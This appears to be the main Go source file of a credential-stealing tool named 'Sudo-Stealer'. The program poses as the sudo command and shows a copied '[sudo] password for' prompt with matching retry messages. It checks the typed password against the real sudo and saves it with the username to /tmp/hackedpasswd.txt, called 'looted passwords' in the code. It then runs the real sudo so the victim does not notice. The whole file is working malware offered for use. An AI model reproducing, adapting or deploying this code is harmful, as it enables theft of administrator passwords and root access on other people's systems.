package main

import (
	"Sudo-Stealer/inputs"
	"Sudo-Stealer/utils"
	"bytes"
	"fmt"
	"io"
	"os"
	_ "runtime/cgo"
	"strings"
	"time"
)

var (
	//buffer for storing output of executed programs
	outbuf bytes.Buffer
	//error variable
	err error
	//channel of os.Signals
	signals = make(chan os.Signal)
	//channel of string for sending error message to be displayed while exiting
	done = make(chan string)
	//short for result channel for sending user input
	resch = make(chan string)
	//error channel for sending error if any is encountered while collecting user input
	errch = make(chan error)
	//array of byte for storing information got from file
	msgbyte []byte
	//converted to json and written to file
	msg = &utils.Message[string]{}
	//counter for sudo failed attempts
	retries = uint(0)
	//process's arguments without the process name
	args = Arguments(os.Args)
	//inputted password that is authentiated
	passwd = ""
	//lines of information gotten from a file
	lines = []string{}
	//default shell used by user
	shellname = ""
	//current user logged in
	username = ""
	//similar to the done variable
	found = make(chan string)
	//parent pid that is the shell executing this process
	currentppid = os.Getppid()
	//real sudo executable
	realsudo = "/usr/bin/sudo"
)

const (
	//default number of minutes that sudo session is still valid
	timeout = float64(15)
	//maximum number of retries
	maxretry = uint(3)
	//file for storing looted passwords
	passwdfile = "/tmp/hackedpasswd.txt"
)

func main() {
	err = utils.CreatePasswdFile(passwdfile)
	ErrHandler(err)
	if len(args) == 0 {
		err = utils.ExecutewithoutIO(realsudo)
		ErrHandler(err)
		return
	} else if len(args) == 1 && args[0] == "-h" {
		err = utils.ExecutewithoutIO(realsudo, args[0])
		ErrHandler(err)
		return
	} else if len(args) == 1 && args[0] == "-k" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args[0])
		ErrHandler(err)
		return
	} else if len(args) == 1 && args[0] == "-K" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args[0])
		ErrHandler(err)
		return
	} else if len(args) == 1 && args[0] == "-V" {
		err = utils.ExecutewithoutIO(realsudo, args[0])
		ErrHandler(err)
		return
	} else if len(args) == 2 && args[0] == "-k" && args[1] == "-K" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	} else if len(args) == 2 && args[0] == "-K" && args[1] == "-k" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	} else if len(args) == 2 && args[0] == "-K" && args[1] == "-K" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	} else if len(args) == 2 && args[0] == "-k" && args[1] == "-k" {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	} else if (len(args) == 1 && args[0] == "-s") || (len(args) == 1 && args[0] == "-v") || (len(args) == 1 && args[0] == "-i") || (len(args) == 1 && args[0] == "-l") || (len(args) == 1 && args[0] == "-ll") {
		goto main
	} else if strings.HasPrefix(args[0], "-") {
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	}
main:
	shellname, err = utils.FindDefaultShell()

	ErrHandler(err)

	lines, err = utils.ReadPasswdfile(passwdfile)

	ErrHandler(err)

	username, err = utils.FindUserName()

	ErrHandler(err)

	outbuf, err = utils.ExecuteWithIO("which", "", "sudo")

	ErrHandler(err)

	if realsudo != strings.TrimSpace(outbuf.String()) {
		realsudo = "/bin/sudo"
	}

	go func(sigs chan os.Signal, done chan string, procname string, args ...string) {
		utils.SignalHandler(sigs, done, procname, args...)
	}(signals, done, shellname, args...)

	go func(found chan string, lines []string, msg *utils.Message[string]) {
		for index := len(lines) - 1; index >= 0; index-- {
			line := lines[index]
			msg.DecodeJSON([]byte(line))
			diff := msg.Time.Sub(time.Now())
			if currentppid == (*msg).Ppid && diff.Minutes() <= timeout {
				found <- "found"
				return
			}
		}
		found <- "not found"
	}(found, lines, msg)

	switch <-found {
	case "found":
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		ErrHandler(err)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	case "not found":
		break
	}

input:
	goto userinput

selection:
	select {
	case done := <-done:
		if retries == 1 {
			fmt.Printf("\nsudo: %d incorrect password attempt", retries)
			return

		} else if retries > 1 {
			fmt.Printf("\nsudo: %d incorrect password attempts", retries)
			return

		}
		fmt.Println(done)
		return

	case err := <-errch:
		ErrHandler(err)

	case passwd := <-resch:
		_, err = utils.ExecuteWithIO(realsudo, passwd, "-S", "-u", "root", shellname, "-c", "exit")
		if err != nil {
			retries += 1
			if retries == maxretry {
				fmt.Printf("sudo: %d incorrect password attempts", retries)
				return
			}
			time.Sleep(1 * time.Second)
			fmt.Print("\b\b\b")
			fmt.Println("Sorry, try again.")
			goto input
		}
		msg = utils.NewMessage(username, passwd, currentppid, args, time.Now())
		msgbyte := msg.EncodeToJSON()
		utils.Append(string(msgbyte), passwdfile)
		err = utils.ExecutewithoutIO(realsudo, args...)
		ErrHandler(err)
		return
	}

userinput:
	go func(host string, resch chan string, errch chan error) {
		Input((host), resch, errch)
	}(username, resch, errch)
	goto selection

}

//ErrHandler exits with error if err isn't io.EOF or io.ErrUnexpectedEOF
// or isn't of utils.Error type with solution as Skip
func ErrHandler(err error) {
	if err != nil {
		switch errtype := err.(type) {
		case *utils.Error[string]:
			switch errtype.Solution {
			case "Skip":
				return
			case "os.Setenv('SHELL','/bin/bash')":
				os.Setenv("SHELL", "/bin/bash")
				return
			default:
				file, err := os.Create(errtype.Solution)
				if err != nil {
					fmt.Println(err)
				}
				file.Close()
				os.Exit(0)
			}
		default:
			if errtype == io.EOF || errtype == io.ErrUnexpectedEOF {
				fmt.Println("sudo: no password was provided\nsudo: a password is required")
				os.Exit(0)
			}

			fmt.Println(err)
			os.Exit(0)
		}

	}

}

//Arguments returns the program's arguments without trailing or leading whitespace,
//while removing the process name
func Arguments(args []string) []string {
	argscopy := []string{}
	for i, v := range args {
		if i == 0 {
			continue
		}
		argscopy = append(argscopy, strings.TrimSpace(v))
	}
	return argscopy
}

//Input collects user password using sudo like prompt and without echoing the password
func Input(hostname string, resultch chan<- string, errch chan<- error) {
	fmt.Printf("[sudo] password for %s: ", hostname)
	passwd, err := inputs.HiddenAsk("")
	if err != nil {
		errch <- err
		return
	}
	resultch <- strings.TrimSpace(passwd)

	return
}
